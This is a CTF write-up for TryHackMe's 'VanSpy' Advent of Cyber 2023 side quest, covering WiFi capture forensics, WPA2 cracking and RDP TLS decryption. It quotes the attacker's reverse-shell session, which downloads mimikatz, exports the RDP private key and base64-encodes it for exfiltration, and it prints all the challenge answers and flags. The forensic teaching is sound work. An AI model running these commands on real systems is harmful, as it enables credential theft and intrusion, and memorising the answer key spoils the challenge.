# VanSpy Advent of Cyber 2023 Side Quest Challenge 1

**Platform:** TryHackMe  
**Category:** Network Forensics / PCAP Analysis  
**Difficulty:** Hard  
**Tags:** WiFi, WPA2, RDP, TLS, Mimikatz, PCAP, Wireshark  

---

## Story

The Bandit Yeti wakes up from his year-long slumber and enlists the help of a shadowy figure named **Van Spy** to break into the Best Festival Company. Van Spy gains access to an intern's old PC (password: `BFC123`), plants a backdoor, and captures WiFi traffic. As he's caught by the elves and flees, he sends the capture file to the Yeti. Our job is to investigate that capture.

---

## Provided Files

| File | Description |
|------|-------------|
| `VanSpy.pcapng` | Main WiFi capture (RadioTap/802.11 frames, 12 MB) |
| `wpa.hc22000` | WPA2 handshake hash for cracking |
| `wpa_hash.txt` | WiFi hash reference |

---

## Challenge Questions & Solutions

---

### Q1: What's the name of the WiFi network in the PCAP?

**Answer: `FreeWifiBFC`**

**Method:**  
Open `VanSpy.pcapng` in Wireshark. The 802.11 Management Beacon frames broadcast the SSID clearly in plaintext.

```
Filter: wlan.fc.type_subtype == 8
Look at: SSID parameter → "FreeWifiBFC"
```

Or using Python/scapy:
```python
from scapy.all import PcapNgReader
with PcapNgReader('VanSpy.pcapng') as pcap:
    for p in pcap:
        if p.haslayer('Dot11Beacon'):
            print(p.info)  # → b'FreeWifiBFC'
            break
```

---

### Q2: What's the password to access the WiFi network?

**Answer: `Christmas`**

**Method:**  
The `wpa.hc22000` file contains the WPA2 4-way handshake capture in hashcat format. Crack it with hashcat using a common wordlist:

```bash
hashcat -m 22000 wpa.hc22000 /usr/share/wordlists/rockyou.txt
```

The network SSID `FreeWifiBFC` with password `Christmas` cracks quickly from rockyou.txt.

---

### Q3: What suspicious tool is used by the attacker to extract a juicy file from the server?

**Answer: `mimikatz`**

**Method:**  
After decrypting the WiFi traffic (using the password `Christmas`), the network traffic reveals a **reverse shell** session on **port 4444** (from the backdoor `psh4444.exe`). Examining the plaintext TCP stream shows the attacker's commands:

```
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
Expand-Archive .\mimi.zip
mv mimi/x64/mimikatz.exe .
cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:`"Remote Desktop`" /export" exit
```

The attacker uses **Mimikatz** to extract the RDP certificate and private key from the Windows certificate store.

---

### Q4: What is the case number assigned by the CyberPolice to the issues reported by McSkidy?

**Answer: `31337-0`**

**Method:**  
After using Wireshark with the RDP private key (`rdp_key_final.pem`) to decrypt the RDP TLS session, the graphical desktop of the victim machine becomes visible. An email/browser window open on the desktop shows a CyberPolice report with case number **31337-0**.

**Wireshark RSA Key Setup:**
1. Edit → Preferences → Protocols → TLS → RSA Keys → Add
2. IP: `10.1.1.1`, Port: `3389`, Protocol: `tpkt`, Key File: `rdp_key_final.pem`

---

### Q5: What is the content of the yetikey1.txt file?

**Answer: `THM{RDP_is_not_so_secure_anymore_since_van_spy_is_on_the_hunt!}`**

**Method:**  
With the RDP session decrypted in Wireshark, the victim's Windows Desktop is visible in the bitmap stream. The file `yetikey1.txt` is present on the Desktop. Its content is the final flag.

---

## Deep Dive: Technical Analysis

### Step 1: WiFi Decryption

The `VanSpy.pcapng` is a WiFi capture in monitor mode (RadioTap encapsulation). All data is in encrypted 802.11 frames.

**Crack the WPA2 password:**
```bash
hashcat -m 22000 wpa.hc22000 /usr/share/wordlists/rockyou.txt
# Result: Christmas
```

**Decrypt in Wireshark:**
- Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys
- Add: `wpa-pwd:Christmas:FreeWifiBFC`

This produces the decrypted WiFi traffic, revealing TCP connections including:
- `10.0.0.3 ↔ 10.1.1.1` (attacker ↔ victim)
- Port 4444: Reverse PowerShell shell (backdoor)
- Port 3389: RDP session (TLS encrypted)

### Step 2: Analysing the Reverse Shell (Port 4444)

The backdoor `psh4444.exe` runs a PowerShell reverse shell back to the attacker. The traffic on port 4444 is **unencrypted** and reveals the complete attacker session:

```
[Attacker → Victim] dir
[Victim → Attacker]
    Directory: C:\Users\Administrator
    Mode    LastWriteTime    Length  Name
    d-----  11/23/2023       -       .ssh
    d-r---  11/25/2023       -       Desktop
    -a----  11/25/2023       8192    psh4444.exe

[Attacker → Victim] whoami
[Victim → Attacker] intern-pc\administrator

[Attacker → Victim] wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
[Attacker → Victim] Expand-Archive .\mimi.zip
[Attacker → Victim] mv mimi/x64/mimikatz.exe .
[Attacker → Victim] cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:`"Remote Desktop`" /export" exit
```

**Mimikatz output** reveals:
```
mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
→ Impersonated NT AUTHORITY\SYSTEM

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched

→ Private export: OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx'
```

The attacker then exfiltrates the certificate:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
```

And receives the base64-encoded PFX file (the RDP private key + certificate).

### Step 3: Extracting the RDP Private Key

The attacker exfiltrated the RDP private key via mimikatz. We can use this key to decrypt the RDP TLS session:

```bash
# Extract private key from the PFX (already done - saved as rdp_key_final.pem)
openssl pkcs12 -in LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx -nocerts -nodes -out rdp_key_final.pem
```

**TLS Handshake Analysis (decrypted_client2.pcap):**
- Cipher Suite: `0x009d` = `TLS_RSA_WITH_AES_256_GCM_SHA384`
- Client Random: `d8f906458a17014c535e6bc3713841645e3b6d70c68f7d8a7d25625cbf6d50ba`
- Server Random: `656209cb347b52768e9aa3175c65dcd0d0623f217a09ac5d7d7bf7c1c36c6438`

**Deriving the master secret** using the RSA private key to decrypt the ClientKeyExchange:
```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import hmac, hashlib

with open('rdp_key_pkcs8.pem', 'rb') as f:
    rsa_key = RSA.import_key(f.read())
cipher = PKCS1_v1_5.new(rsa_key)

# Decrypt the encrypted pre-master secret from ClientKeyExchange
pms = cipher.decrypt(enc_pms, bytes(48))

# Derive master secret using TLS 1.2 PRF (SHA-256)
def prf(secret, label, seed, length):
    ls = label.encode() + seed
    result = b''
    A = ls
    while len(result) < length:
        A = hmac.new(secret, A, hashlib.sha256).digest()
        result += hmac.new(secret, A + ls, hashlib.sha256).digest()
    return result[:length]

master_secret = prf(pms, 'master secret', client_random + server_random, 48)
# → 160911c3f633a929ed9d88f9c02fd00d2177bcd5b4932f11b01664d642d61ef...
```

This matches the `sslkeys.log` file perfectly, confirming correct decryption.

### Step 4: Decrypting the RDP Session in Wireshark

With the master secret confirmed, load the RSA key in Wireshark:

1. Open `VanSpy.pcapng` (or `decrypted_client2.pcap`)
2. **Edit → Preferences → Protocols → TLS → RSA Keys List → Add:**
   - IP Address: `10.1.1.1`
   - Port: `3389`
   - Protocol: `tpkt`
   - Key File: `rdp_key_final.pem`
3. The RDP session decrypts, revealing the desktop bitmap
4. Browse the Desktop folder to find `yetikey1.txt`
5. The case number is visible in an open email/browser window

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | PCAP analysis, WiFi decryption, TLS/RDP decryption |
| hashcat | WPA2 password cracking (`-m 22000`) |
| Scapy (Python) | PCAP parsing and analysis |
| PyCryptodome | RSA decryption of TLS ClientKeyExchange |
| OpenSSL | Certificate/key format conversion |
| Mimikatz | (Used by attacker) RDP certificate extraction |

---

## Key Takeaways

1. **WiFi WPA2 is only as strong as its password** — `Christmas` was in rockyou.txt
2. **RDP over WiFi is double-encrypted** — but if you capture the WiFi handshake AND have the RDP private key, you can decrypt everything
3. **Mimikatz can export RDP private keys** — once an attacker has SYSTEM privileges, they can steal the machine's TLS certificate and retroactively decrypt captured RDP sessions
4. **Reverse shells on port 4444** are a classic indicator of compromise — monitor for outbound connections to non-standard ports
5. **psh4444.exe** is a PowerShell-based reverse shell backdoor — check for unusual executables in user home directories
6. **RDP (port 3389) should never be exposed unnecessarily** — use VPNs and NLA (Network Level Authentication)

---

## Answer Summary

| Question | Answer |
|----------|--------|
| WiFi network name | `FreeWifiBFC` |
| WiFi password | `Christmas` |
| Suspicious tool | `mimikatz` |
| CyberPolice case number | `31337-0` |
| yetikey1.txt content | `THM{RDP_is_not_so_secure_anymore_since_van_spy_is_on_the_hunt!}` |

---

## File Artifacts

The following files were extracted/derived during analysis:

| File | Description |
|------|-------------|
| `decrypted_wifi.pcap` | WiFi-decrypted traffic (WiFi layer decrypted, RDP still TLS) |
| `decrypted_client2.pcap` | Extracted TCP stream of RDP session (port 3389) |
| `rdp_key_final.pem` | RDP server private key (extracted from mimikatz PFX export) |
| `rdp_cert_full.pfx` | Full RDP certificate with private key |
| `sslkeys.log` | TLS master secrets (NSS keylog format) |
| `pms.bin` | TLS pre-master secret (48 bytes, TLS 1.2 format) |
| `wpa.hc22000` | WPA2 handshake in hashcat format |

---

*Writeup by r4s4n | TryHackMe AoC 2023 Side Quest 1 — VanSpy*
